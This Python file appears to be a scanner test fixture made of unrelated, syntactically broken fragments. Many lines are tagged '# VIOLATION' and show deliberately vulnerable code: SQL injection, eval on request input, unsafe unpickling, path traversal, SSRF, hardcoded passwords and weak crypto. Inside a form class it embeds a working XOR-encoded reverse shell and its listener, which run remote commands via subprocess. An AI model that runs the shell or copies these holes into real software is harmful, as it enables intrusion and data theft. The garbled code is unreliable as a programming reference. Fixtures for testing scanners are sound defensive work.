import socket,subprocess,sys
import cgi
import pickle
import random
import hmac

from hashlib import pbkdf2_hmac
from cStringIO import StringIO
from django.http import FileResponse
from myapp.models import User
from django.conf.urls import patterns
from django.contrib import admin
from django.http.response import HttpResponse
from Crypto.Ciphers import AES
from Crypto.Ciphers import AES
from abc import ABCMeta

class EmptyClass():

class AbstractClass():
  @abstractmethod
  def shape(self, request):
    self.shape = request
    
class Shape(object):
    __metaclass__ = abc.ABCMeta

    @abc.abstractmethod
    def method_to_implement(self, input):
        """Method documentation"""
        return
        
@DeprecationWarning
class UserForm(ModelForm):
	#TODO: =hello Suspicious Comment
    global model = User
    exclude = ['id'] # VIOLATION	
	
	def Empty_method(request): # VIOLATION
	
	def EventHandler(request): # VIOLATION
	
	@EventHandler
	def Test:

	__unused_varClass = ""
	def __reduce__(self):
          reduce_list = super(UserForm, self).__reduce__()
          return reduce_list
	def __init__(request, nonUnused): # VIOLATION
    RHOST = sys.argv[1]
    RPORT = 443
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
     
    while True:
         # receive XOR encoded data from network socket
         data = s.recv(1024)
     
         # XOR the data again with a '\x41' to get back to normal data
         en_data = bytearray(data)
         for i in range(len(en_data)):
           en_data[i] ^=0x41
     
         # Execute the decoded data as a command.  The subprocess module is great because we can PIPE STDOUT/STDERR/STDIN to a variable
         comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         STDOUT, STDERR = comm.communicate()
     
         # Encode the output and send to RHOST
         en_STDOUT = bytearray(STDOUT)
         for i in range(len(en_STDOUT)):
           en_STDOUT[i] ^=0x41
         s.send(en_STDOUT)
    s.close()
    s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 443))
    s.listen(2)
    print "Listening on port 443... "
    (client, (ip, port)) = s.accept()
    print " Received connection from : ", ip
     
    while True:
     command = raw_input('~$ ')
     encode = bytearray(command)
     for i in range(len(encode)):
       encode[i] ^=0x41
     client.send(encode)
     en_data=client.recv(2048)
     decode = bytearray(en_data)
     for i in range(len(decode)):
       decode[i] ^=0x41
     print decode
     
    client.close()
    s.close()
		return ""
	
	def __return_method(): # VIOLATION
		global unused_var = ""
		print("unused_method");  
		a = 1
		break
		if (a==3): # No explicit constants directly used in the code VIOLATION
			return ""
		if (a==4): # No explicit constants directly used in the code VIOLATION
			return ""
		if (a==5): # No explicit constants directly used in the code VIOLATION
			return ""
		if (a==6): # No explicit constants directly used in the code VIOLATION
			return ""
		if (a==7): # No explicit constants directly used in the code VIOLATION
			return ""
		if (a==8): # No explicit constants directly used in the code VIOLATION
			return ""
			
	def __unused_method(request, nonUnused): # VIOLATION
		unused_var = ""
		print("unused_method");  
		__return_method
		a = 1
		if (a==3): # No explicit constants directly used in the code VIOLATION
			print("No explicit constants directly used in the code")  
		#UPGRADE_WARNING =hello Suspicious Comment
		try: # VIOLATION Empty try
		except: # VIOLATION Empty except
		finally: 
		
			return `num` # VIOLATION return in Finally

		for g in p.get_token().get_token_groups():
				wpc.conf.exploitable_by.append(g[0])
				wpc.conf.exploitable_by.append(g[0])
				wpc.conf.exploitable_by.append(g[0])
				cgi.print_environ()  # VIOLATION
				path = request.GET['returnURL']
				uname = request.POST['username']
				request.session['username'] = uname  # VIOLATION
				response.addHeader("Access-Control-Allow-Origin", "*")
				try:
				except:
					print(sys.exc_info()[2])  # VIOLATION
					return FileResponse(open(path, 'rb')) # VIOLATION
				finally:
				wpc.conf.exploitable_by.append(g[0])
				wpc.conf.exploitable_by.append(g[0])
				wpc.conf.exploitable_by.append(g[0])
				cgi.print_environ()  # VIOLATION
				path = request.GET['returnURL']
				uname = request.POST['username']
				request.session['username'] = uname  # VIOLATION
				response.addHeader("Access-Control-Allow-Origin", "*")
				try:
				except:
					print(sys.exc_info()[2])  # VIOLATION
					return FileResponse(open(path, 'rb')) # VIOLATION
				finally:
				wpc.conf.exploitable_by.append(g[0])
				wpc.conf.exploitable_by.append(g[0])
				wpc.conf.exploitable_by.append(g[0])
				wpc.conf.exploitable_by.append(g[0])
				wpc.conf.exploitable_by.append(g[0])
				wpc.conf.exploitable_by.append(g[0])
				
		for g in p.get_token().get_token_groups():
			break # Avoid use of 'break' statement outside switch/for/while VIOLATION
			continue #VIOLATION
			return
			if "|".join(g[1]).find("USE_FOR_DENY_ONLY") == -1:
				wpc.conf.exploitable_by.append(g[0])
				for g in p.get_token().get_token_groups():
					break # Avoid use of 'break' statement outside switch/for/while VIOLATION
					continue #VIOLATION
					return
					if "|".join(g[1]).find("USE_FOR_DENY_ONLY") == -1:
						wpc.conf.exploitable_by.append(g[0])
						for g in p.get_token().get_token_groups():
							break # Avoid use of 'break' statement outside switch/for/while VIOLATION
							continue #VIOLATION
							return
							if "|".join(g[1]).find("USE_FOR_DENY_ONLY") == -1:
								wpc.conf.exploitable_by.append(g[0])
			
		while True:
			users, _, resume = win32net.NetWkstaUserEnum(wpc.conf.remote_server, 1 , resume , 999999 )
			for user in users:
				self.issues.get_by_id("WPC140").add_supporting_data('usernames', ["%s\\%s" % (user['logon_domain'], user['username'])])
				print "User logged in: Logon Server=\"%s\" Logon Domain=\"%s\" Username=\"%s\"" % (user['logon_server'], user['logon_domain'], user['username'])
				return
			if resume == 0:
				break
				return
		goto label1
		while False:
			users, _, resume = win32net.NetWkstaUserEnum(wpc.conf.remote_server, 1 , resume , 999999 )
			for user in users:
				self.issues.get_by_id("WPC140").add_supporting_data('usernames', ["%s\\%s" % (user['logon_domain'], user['username'])])
				print "User logged in: Logon Server=\"%s\" Logon Domain=\"%s\" Username=\"%s\"" % (user['logon_server'], user['logon_domain'], user['username'])
			if resume == 0:
				break				
					
	def file_disclosure(request):
		cgi.print_environ()  # VIOLATION
		global path = request.GET['returnURL']
		uname = request.POST['username']
		request.session['username'] = uname  # VIOLATION
		response.addHeader("Access-Control-Allow-Origin", "*")
		try:
		except:
			print(sys.exc_info()[2])  # VIOLATION
			return FileResponse(open(path, 'rb')) # VIOLATION
		finally:
		
	def handle_upload(request):
	  files = request.FILES
	  for f in files.values():
		path = default_storage.save('upload/', File(f))  # VIOLATION
	  admin.autodiscover()
	  url(r'^admin/', include(admin.site.urls)), # VIOLATION
	  home = os.getenv('APPHOME')
	  cmd = home.join(INITCMD)
	  os.system(cmd); # VIOLATION
	  req = self.request()  # fetch the request object
	  eid = req.field('eid',None) # tainted request message
	  self.writeln("Employee ID:" + eid) # VIOLATION
	  self.writeln("Employee ID:" + escape(eid)) # VIOLATION
	  cursor.execute("select * from emp where id="+eid)
	  row = cursor.fetchone()
	  self.writeln('Employee name: ' + row["emp"]') # VIOLATION
	  userOps = request.GET['operation']
	  result = eval(userOps) # VIOLATION
	  src = StringIO()
	  p = pickle.Pickler(src)
	  datastream = src.getvalue()
	  print repr(datastream)
	  dst = StringIO(datastream)  
	  up = pickle.Unpickler(dst)  # VIOLATION
	  author = request.GET['AUTHOR_PARAM']
	  response.set_cookie("author: %s" % author, value)
	  body = request.GET['body']
	  subject = request.GET['subject']
	  session = smtplib.SMTP(smtp_server, smtp_tls_port)
	  session.ehlo()
	  session.starttls()
	  session.login(username, password)
	  headers = "\r\n".join(["from: webform@acme.com",
						   "subject: [Contact us query] " + subject,
						   "to: support@acme.com",
						   "mime-version: 1.0",
						   "content-type: text/html"])
	  content = headers + "\r\n\r\n" + body
	  session.sendmail("webform@acme.com", "support@acme.com", content) # VIOLATION
	  user = request.GET['user']
	  session = smtplib.SMTP(smtp_server, smtp_tls_port)
	  session.ehlo()
	  session.starttls()
	  session.login(username, password)
	  session.docmd("VRFY", user)  # VIOLATION  
	  name = req.field('name')
	  logout = req.field('logout')
	  if (logout):
	  else:
		logger.error("Attempt to log out: name: %s logout: %s" % (name,logout))
		
	def store(request):
		req = self.request()  # fetch the request object
		id = request.GET['id']
		result = get_page_from_somewhere()
		response = HttpResponse(result)
		cache_time = 1800
		cache.set("req-" % id, response, cache_time) # VIOLATION
		return response	
		strDest = request.field("dest")
		redirect(strDest)
		rName = req.field('reportName')
		rFile = os.open("/usr/local/apfr/reports/" + rName) # VIOLATION
		os.unlink(rFile); # VIOLATION
		filename = CONFIG_TXT['sub'] + ".txt";
		handle = os.open(filename)
		host=request.GET['host']
		dbconn = db.connect(host=host, port=1234, dbname=ticketdb) # VIOLATION
		userName = req.field('userName')
		itemName = req.field('itemName')
		query = "SELECT * FROM items WHERE owner = ' " + userName +" ' AND itemname = ' " + itemName +"';"
		cursor.execute(query) # VIOLATION
		url = request.GET['url']
		handle = urllib.urlopen(url) # VIOLATION
		catalog = request.GET['catalog']
		path = request.GET['path']
		os.putenv(catalog, path) # VIOLATION
		name = request.GET['name']
		components = name.split('.')
		mod = __import__(components[0])
		for comp in components[1:]:
			mod = getattr(mod, comp) # VIOLATION
			return mod
		tree = etree.parse('articles.xml')
		emailAddrs = "/accounts/account[acctID=" + request.GET["test1"] + "]/email/text()"
		r = tree.xpath(emailAddrs) # VIOLATION		
		xml = StringIO.StringIO(request.POST['xml'])
		xslt = StringIO.StringIO(request.POST['xslt'])
		xslt_root = etree.XML(xslt)
		xml = StringIO.StringIO(request.POST['xml'])
		xslt = StringIO.StringIO(request.POST['xslt'])
		xslt_root = etree.XML(xslt) # VIOLATION
		xml = StringIO.StringIO(request.POST['xml'])
		xslt = StringIO.StringIO(request.POST['xslt'])
		xslt_root = etree.XML(xslt)
		transform = etree.XSLT(xslt_root) # VIOLATION

	def view_method(request):
	  res = HttpResponse()
	  res.set_cookie("emailCookie", email) # VIOLATION
	  res.set_cookie("emailCookie", email, expires=time()+60*60*24*365*10, secure=True) # OK
	  return res

	def view_method(request):
	  res = HttpResponse()
	  res.set_cookie("emailCookie", email) # VIOLATION
	  res.set_cookie("emailCookie", email, expires=time()+60*60*24*365*10, secure=True, httponly=True) # OK
	  return res
	  
	def genReceiptURL(self,baseURL):
			randNum = random.random() # VIOLATION
			receiptURL = baseURL + randNum + ".html"
			return receiptURL  
			random.seed(123456)  # VIOLATION
			print "Random: %d" % random.randint(1,100)  
			cipher = AES.new("", AES.MODE_CFB, iv) # VIOLATION
			msg = iv + cipher.encrypt(b'Attack at dawn')
			cipher = AES.new(None, AES.MODE_CFB, iv) # VIOLATION
			msg = iv + cipher.encrypt(b'Attack at dawn')
			mac = hmac.new("", plaintext).hexdigest() # VIOLATION
			dk = pbkdf2_hmac('sha256', '', salt, 100000) # VIOLATION
			props = os.open('config.properties')
			password = props[0]
			link = MySQLdb.connect (host = "localhost",
							   user = "testuser",
							   passwd = password,  # VIOLATION
							   db = "test")
			pwd = "tiger"
			passwd = pwd								
			response.writeln("Password:" + pwd)  # VIOLATION
			response.writeln("Password:" + passwd)  # VIOLATION
			props = os.open('config.properties')
			password = base64.b64decode(props[0])

			link = MySQLdb.connect (host = "localhost",
							   user = "testuser",
							   passwd = password,
							   db = "test")
			filename = System.getProperty("com.domain.application.dictionaryFile");
			dictionaryFile = new File(filename);  # VIOLATION						   
			temp = re.sub('([\\\%\^])','\\1\\1', cmd_args[i])  # VIOLATION

class MyABC(metaclass=ABCMeta):
  MyABC.register(tuple)
  
  def Django_1(self)
    p = DifferentDjangoVersion(title="FooBar")
    msg = "Pickled model instance's Django version 1.0 does not match the current version %s." % get_version()
    with self.assertRaisesMessage(RuntimeWarning, msg):
        pickle.loads(pickle.dumps(p))


class Clock(object):

    def __init__(self,hours=0, minutes=0, seconds=0):
        self.__hours = hours
        self.__minutes = minutes
        self.__seconds = seconds

    def set(self,hours, minutes, seconds=0):
        self.__hours = hours
        self.__minutes = minutes
        self.__seconds = seconds

    def tick(self):
        """ Time will be advanced by one second """
        if self.__seconds == 59:
            self.__seconds = 0
            if (self.__minutes == 59):
                self.__minutes = 0
                self.__hours = 0 if self.__hours==23  else self.__hours+1
	    else:
		self.__minutes += 1;
	else:
            self.__seconds += 1;

    def display(self):
        print("%d:%d:%d" % (self.__hours, self.__minutes, self.__seconds))

    def __str__(self):
        return "%2d:%2d:%2d" % (self.__hours, self.__minutes, self.__seconds)

x = Clock()
print(x)
for i in xrange(10000):
    x.tick()
print(x)
url = request.GET['url']
if "http://" in url:  //VIOLATION
    content = urllib.urlopen(url)
    return HttpResponse(content)
if "ftp://" in url:   //VIOLATION
    content = urllib.urlopen(url)
try:
		
    filename = System.getProperty("file://proc/self/cwd/app/settings.py")   //VIOLATION
    if "file://" in filename:   //OK
        content = urllib.urlopen(filename)  //VIOLATION
except:
    return cls (self, filename)  //OK
    
class Calendar(object):
    months = (31,28,31,30,31,30,31,31,30,31,30,31)

    def __init__(self, day=1, month=1, year=1900):
        self.__day = day
        self.__month = month
        self.__year = year

    def leapyear(self,y):
	if y % 4:
	   # not a leap year
	   return 0;
	else:
	   if y % 100:
	     return 1;
           else:
	     if y % 400:
                return 0
	     else:
		return 1;

    def set(self, day, month, year):
        self.__day = day
        self.__month = month
        self.__year = year


    def get():
	return (self, self.__day, self.__month, self.__year)
    def advance(self):
        months = Calendar.months
	max_days = months[self.__month-1]
	if self.__month == 2:
		max_days += self.leapyear(self.__year)
	if self.__day == max_days:
		self.__day = 1
		if (self.__month == 12):
			self.__month = 1
			self.__year += 1
		else:
			self.__month += 1
	else:
		self.__day += 1


    def __str__(self):
       return str(self.__day)+"/"+ str(self.__month)+ "/"+ str(self.__year)

if __name__ == "__main__":
   x = Calendar()
   print(x)
   x.advance()
   print(x)

from clock import Clock
from calendar import Calendar

class CalendarClock(Clock, Calendar):

   def __init__(self, day,month,year,hours=0, minutes=0,seconds=0):
        Calendar.__init__(self, day, month, year)
        Clock.__init__(self, hours, minutes, seconds)

   def __str__(self):
       return Calendar.__str__(self) + ", " + Clock.__str__(self)


if __name__  == "__main__":
   x = CalendarClock(24,12,57)
   print(x)
   for i in range(1000):
      x.tick()
   for i in range(1000):
      x.advance()
   print(x)

class Foo(object):
    def __getitem__(self, index):
        ...
    def __len__(self):
        ...
    def get_iterator(self):
        return iter(self)

class MyIterable:
    __metaclass__ = ABCMeta

    @abstractmethod
    def __iter__(self):
        while False:
            yield None

    def get_iterator(self):
        return self.__iter__()

    @classmethod
    def __subclasshook__(cls, C):
        if cls is MyIterable:
            if any("__iter__" in B.__dict__ for B in C.__mro__):
                return True
        return NotImplemented

MyIterable.register(Foo)